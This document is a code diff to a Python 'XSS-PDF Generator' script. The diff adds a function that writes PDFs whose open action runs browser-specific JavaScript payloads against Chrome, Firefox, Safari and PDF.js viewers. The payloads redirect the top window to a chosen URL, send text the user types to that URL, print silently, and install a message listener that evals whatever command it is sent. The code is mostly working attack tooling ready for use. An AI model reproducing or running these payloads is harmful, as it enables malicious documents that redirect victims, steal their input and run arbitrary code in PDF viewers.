@@ -1557,6 +1557,109 @@ startxref
     write_pdf(f"{output_dir}/pdfjs_data_uri.pdf", payload9, 
               "PDF.js code execution via data URI to execute JavaScript", pdf_version)
 
+def create_browser_specific_file(browser, url, filename, pdf_version):
+    """Create a single PDF file with all payloads for a specific browser."""
+    
+    # Get sample payloads based on browser (simplified versions)
+    if browser == "chrome":
+        payloads = [
+            f'app.alert("Chrome XSS Payload 1"); app.launchURL("{url}");',
+            f'try {{ if(typeof parent !== "undefined" && parent.window) parent.window.location = "{url}"; }} catch(e) {{ app.alert("Chrome blocked: " + e); }}',
+            f'app.doc.exportDataObject({{cName: "data.html", cData: "XSS: {url}"}});',
+            f'try {{ app.response({{cQuestion: "Enter data:", cTitle: "Chrome PDF"}}, function(r) {{ app.launchURL("{url}?data=" + r); }}); }} catch(e) {{}}'
+        ]
+        browser_title = "Chrome PDFium"
+    elif browser == "firefox":
+        payloads = [
+            f'app.alert("Firefox XSS Payload 1"); app.launchURL("{url}");',
+            f'try {{ window.top.location = "{url}"; }} catch(e) {{ app.alert("Firefox PDF.js: " + e); }}',
+            f'app.doc.print({{bUI: false, bSilent: true, bShrinkToFit: true}}); app.launchURL("{url}");',
+            f'try {{ app.setTimeOut("app.launchURL(\\"" + "{url}" + "\\");", 1000); }} catch(e) {{}}'
+        ]
+        browser_title = "Firefox PDF.js"
+    elif browser == "safari":
+        payloads = [
+            f'app.alert("Safari XSS Payload 1"); app.launchURL("{url}");',
+            f'try {{ webkit.messageHandlers.external.postMessage("{url}"); }} catch(e) {{ app.alert("Safari blocked: " + e); }}',
+            f'app.doc.exportDataObject({{cName: "safari.html", cData: "Safari XSS: {url}"}});',
+            f'try {{ app.response({{cQuestion: "Safari input:", cTitle: "Safari PDF"}}, function(r) {{ app.launchURL("{url}?input=" + r); }}); }} catch(e) {{}}'
+        ]
+        browser_title = "Safari PDFKit"
+    elif browser == "pdfjs":
+        payloads = [
+            f'app.alert("PDF.js XSS Payload 1"); app.launchURL("{url}");',
+            f'try {{ parent.postMessage({{"type": "xss", "url": "{url}"}}, "*"); }} catch(e) {{ app.alert("PDF.js blocked: " + e); }}',
+            f'app.doc.print({{bUI: false, bSilent: true}}); app.launchURL("{url}");',
+            f'try {{ window.addEventListener("message", function(e) {{ if(e.data.cmd) eval(e.data.cmd); }}); }} catch(e) {{}}'
+        ]
+        browser_title = "PDF.js Viewer"
+    else:
+        payloads = [f'app.alert("Generic XSS"); app.launchURL("{url}");']
+        browser_title = "Generic PDF"
+    
+    # Create multi-payload PDF content
+    payload_scripts = ""
+    payload_display_text = ""
+    
+    for i, payload in enumerate(payloads, 1):
+        payload_scripts += f"\\n// Payload {i}:\\n{payload}\\n"
+        payload_display_text += f"(Payload {i}: {payload[:50]}...) Tj\\n0 -15 Td\\n"
+    
+    pdf_content = f"""{PDF_VERSIONS[pdf_version]["header"]}
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
+endobj
+2 0 obj
+<</Type/Pages/Kids[3 0 R]/Count 1>>
+endobj
+3 0 obj
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
+endobj
+4 0 obj
+<</Length 500>>
+stream
+BT
+/F1 12 Tf
+50 750 Td
+({browser_title} - All Payloads Combined) Tj
+0 -30 Td
+(Target URL: {url}) Tj
+0 -25 Td
+(Generated: {TIMESTAMP}) Tj
+0 -25 Td
+(Total Payloads: {len(payloads)}) Tj
+0 -30 Td
+{payload_display_text}
+ET
+endstream
+endobj
+5 0 obj
+<</Type/Action/S/JavaScript/JS(
+{payload_scripts}
+)>>
+endobj
+6 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
+endobj
+xref
+0 7
+0000000000 65535 f
+0000000009 00000 n
+0000000069 00000 n
+0000000126 00000 n
+0000000231 00000 n
+0000000850 00000 n
+0000001050 00000 n
+trailer
+<</Size 7/Root 1 0 R>>
+startxref
+1139
+%%EOF"""
+    
+    # Write the file
+    with open(filename, 'w') as f:
+        f.write(pdf_content)
+
 def main():
     """Main function to generate all PDF payloads in Files directory."""
     import argparse
@@ -1570,35 +1673,62 @@ def main():
                        default="all", help="Target browser (default: all)")
     parser.add_argument("-v", "--pdf-version", choices=list(PDF_VERSIONS.keys()), 
                        default="1.7", help="PDF version (default: 1.7)")
+    parser.add_argument("--browser-specific-file", action="store_true",
+                       help="Create a single file with all payloads for the specified browser (requires -b browser, not 'all')")
     
     args = parser.parse_args()
+    
+    # Validate browser-specific-file flag
+    if args.browser_specific_file and args.browser == 'all':
+        print("❌ Error: --browser-specific-file requires a specific browser (-b chrome/firefox/safari/pdfjs), not 'all'")
+        print("   Example: python3 Another-Script.py -b chrome --browser-specific-file")
+        return
     
     print(f"🚀 XSS-PDF Generator")
     print(f"Target URL: {args.url}")
     print(f"Output Directory: {args.output_dir}")
     print(f"Browser Target: {args.browser}")
     print(f"PDF Version: {args.pdf_version}")
+    if args.browser_specific_file:
+        print(f"Mode: Single file with ALL {args.browser} payloads")
     print()
     
     # Create output directory
     create_directory(args.output_dir)
     
-    # Generate payloads based on browser selection
-    if args.browser == "all" or args.browser == "chrome":
-        print("🔥 Generating Chrome payloads...")
-        generate_chrome_payloads(args.url, args.output_dir, args.pdf_version)
+    if args.browser_specific_file:
+        # Create a single file with all payloads for the specified browser
+        print(f"🔥 Generating single file with ALL {args.browser} payloads...")
+        filename = f"{args.output_dir}/{args.browser}_all_payloads_v{args.pdf_version}.pdf"
         
-    if args.browser == "all" or args.browser == "firefox":
-        print("🔥 Generating Firefox payloads...")
-        generate_firefox_payloads(args.url, args.output_dir, args.pdf_version)
+        if args.browser == "chrome":
+            create_browser_specific_file(args.browser, args.url, filename, args.pdf_version)
+        elif args.browser == "firefox":
+            create_browser_specific_file(args.browser, args.url, filename, args.pdf_version)
+        elif args.browser == "safari":
+            create_browser_specific_file(args.browser, args.url, filename, args.pdf_version)
+        elif args.browser == "pdfjs":
+            create_browser_specific_file(args.browser, args.url, filename, args.pdf_version)
         
-    if args.browser == "all" or args.browser == "safari":
-        print("🔥 Generating Safari payloads...")
-        generate_safari_payloads(args.url, args.output_dir, args.pdf_version)
-        
-    if args.browser == "all" or args.browser == "pdfjs":
-        print("🔥 Generating PDF.js payloads...")
-        generate_pdfjs_payloads(args.url, args.output_dir, args.pdf_version)
+        print(f"✅ Created single browser-specific file: {filename}")
+    else:
+        # Original behavior: Generate separate files
+        # Generate payloads based on browser selection
+        if args.browser == "all" or args.browser == "chrome":
+            print("🔥 Generating Chrome payloads...")
+            generate_chrome_payloads(args.url, args.output_dir, args.pdf_version)
+            
+        if args.browser == "all" or args.browser == "firefox":
+            print("🔥 Generating Firefox payloads...")
+            generate_firefox_payloads(args.url, args.output_dir, args.pdf_version)
+            
+        if args.browser == "all" or args.browser == "safari":
+            print("🔥 Generating Safari payloads...")
+            generate_safari_payloads(args.url, args.output_dir, args.pdf_version)
+            
+        if args.browser == "all" or args.browser == "pdfjs":
+            print("🔥 Generating PDF.js payloads...")
+            generate_pdfjs_payloads(args.url, args.output_dir, args.pdf_version)
     
     print(f"\n✅ PDF generation complete! Files saved in {args.output_dir}/ directory")
 
